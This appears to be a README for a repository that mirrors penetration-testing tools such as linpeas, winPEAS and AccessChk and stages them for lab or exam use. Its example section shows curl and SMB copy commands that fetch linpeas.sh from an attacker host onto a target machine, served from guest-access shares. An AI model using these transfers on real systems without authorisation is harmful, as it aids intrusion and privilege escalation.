# cyber-tools

Offline vendoring repository for curated cybersecurity tools. A manifest declares each tool and how to fetch it; a sync engine pulls updates; a scheduled GitHub Action commits only when something actually changed.

## Layout

```
cyber-tools/
├── tools.json                  # declare each tool + how to grab it
├── sync.sh                     # the sync engine
├── scripts/
│   ├── install.sh              # one-step sync + extras (AccessChk, extract Python)
│   └── serve.sh                # one-command HTTP + SMB staging server
├── .github/workflows/sync.yml  # daily cron + manual trigger
└── tools/                      # auto-populated, one dir per tool
```

## Quick start

```bash
chmod +x sync.sh scripts/*.sh
./scripts/install.sh
```

Optional: pass a GitHub token to raise API rate limits during sync:

```bash
GITHUB_TOKEN=<PAT> ./scripts/install.sh
```

## Staging server (HTTP + SMB)

After install, stand up a file server for exam/lab transfers with one command:

```bash
./scripts/serve.sh
```

Defaults:

| Service | Default | Override |
|---------|---------|----------|
| HTTP | `http://0.0.0.0:8080/` | `HTTP_PORT=9000 ./scripts/serve.sh` |
| SMB share | `\\<your-ip>\tools` | `SMB_SHARE=loot ./scripts/serve.sh` |
| SMB credentials | `guest` / `guest` | `SMB_USER=... SMB_PASS=... ./scripts/serve.sh` |
| Served directory | `./tools/` | `SERVE_DIR=/path/to/files ./scripts/serve.sh` |

HTTP uses Python's built-in server. SMB uses `impacket-smbserver` (or `smbserver.py`) if installed (`pip install impacket`). Without impacket, HTTP still works and a warning is printed.

Example target-side fetches:

```powershell
# HTTP
curl http://10.10.14.5:8080/peass-ng/linpeas.sh -o linpeas.sh

# SMB
copy \\10.10.14.5\tools\peass-ng\linpeas.sh .
```

## Acquisition strategies

Each entry in `tools.json` uses a `type` that selects one of three strategies:

| Type | What it does |
|------|--------------|
| `release` | Fetches matching assets from the latest GitHub Release |
| `file` | Raw-downloads specific file(s) from a repo at a given ref |
| `repo` | Shallow-clones the repo and strips `.git` for offline use |

## Adding a tool

Add one JSON object to the `tools` array in `tools.json`. No script edits required.

### Release (latest build artifacts)

```json
{
  "name": "linpeas",
  "type": "release",
  "repo": "peass-ng/PEASS-ng",
  "assets": ["^linpeas\\.sh$", "^winPEASx64\\.exe$"]
}
```

- `assets` — regexes matched against release asset filenames.
- Writes `tools/<name>/.version` with the release tag; skips re-download when the tag is unchanged.

### File (specific paths, not a full clone)

```json
{
  "name": "my-script",
  "type": "file",
  "repo": "owner/repo",
  "ref": "main",
  "paths": ["scripts/audit.sh"]
}
```

- `ref` — branch or tag (defaults to `main` if omitted).
- `paths` — repo-relative paths; directory structure is preserved under `tools/<name>/`.

### Repo (full shallow clone)

```json
{
  "name": "my-tool",
  "type": "repo",
  "repo": "owner/repo",
  "ref": "main"
}
```

- Re-fetched every sync run; Git diff detection avoids empty commits when nothing changed upstream.

## Extras fetched by install.sh

Some tools are not in `tools.json` because they have no suitable GitHub source:

- **AccessChk** — downloaded from the official Sysinternals endpoint (`live.sysinternals.com`) into `tools/accesschk/`. This is the known-good source for `accesschk.exe` and `accesschk64.exe`.
- **Portable Python** — the `static-python` release tarball is extracted automatically after sync.

## Local testing

```bash
chmod +x sync.sh
GITHUB_TOKEN=<PAT> ./sync.sh
```

`GITHUB_TOKEN` is optional locally but recommended — it is sent only on GitHub API calls (not asset downloads) to raise the rate limit.

## GitHub Action setup

The workflow runs daily at 06:00 UTC and on manual trigger (`workflow_dispatch`). It runs `sync.sh`, stages all changes, and commits/pushes only when `git diff --cached` is non-empty.

**Required repo setting:** Settings → Actions → General → Workflow permissions → **Read and write permissions**.

## Stretch goals (not implemented)

- Pin tools to a specific tag or commit SHA for reproducible builds.
- Per-tool post-fetch build hooks (e.g. compile Go/Rust tools in CI before commit).
